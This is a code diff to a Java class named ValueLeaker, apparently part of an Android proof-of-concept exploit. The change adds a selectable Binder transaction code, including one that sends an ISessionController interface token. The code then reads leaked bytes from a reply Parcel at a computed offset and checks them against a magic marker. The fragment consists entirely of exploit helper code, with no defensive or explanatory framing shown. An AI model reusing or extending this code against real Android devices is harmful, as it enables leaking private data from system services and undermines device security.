@@ -11,21 +11,30 @@ public class ValueLeaker {
     private final int mLeakPosition;
     private final int mLeakSize;
     private final long mEndMagic;
+    private final int mTransactCode;
 
-    //
     ValueLeaker(IBinder retriever, int leakPosition, int leakSize, long endMagic) {
+        this(retriever, leakPosition, leakSize, endMagic, IBinder.FIRST_CALL_TRANSACTION);
+    }
+
+    ValueLeaker(IBinder retriever, int leakPosition, int leakSize, long endMagic, int transactCode) {
         mRetriever = Objects.requireNonNull(retriever);
         mLeakPosition = leakPosition;
         mLeakSize = leakSize;
         mEndMagic = endMagic;
+        mTransactCode = transactCode;
     }
 
     public Parcel doLeak() throws RemoteException {
         Parcel leakedParcel = null;
         Parcel data = Parcel.obtain();
         Parcel reply = Parcel.obtain();
-        data.writeInt(1);
-        mRetriever.transact(IBinder.FIRST_CALL_TRANSACTION, data, reply, 0);
+        if (mTransactCode == IBinder.FIRST_CALL_TRANSACTION) {
+            data.writeInt(1);
+        } else {
+            data.writeInterfaceToken("android.media.session.ISessionController");
+        }
+        mRetriever.transact(mTransactCode, data, reply, 0);
         reply.setDataPosition(mLeakPosition + mLeakSize + 4);
         if (reply.readLong() == mEndMagic) {
             leakedParcel = Parcel.obtain();
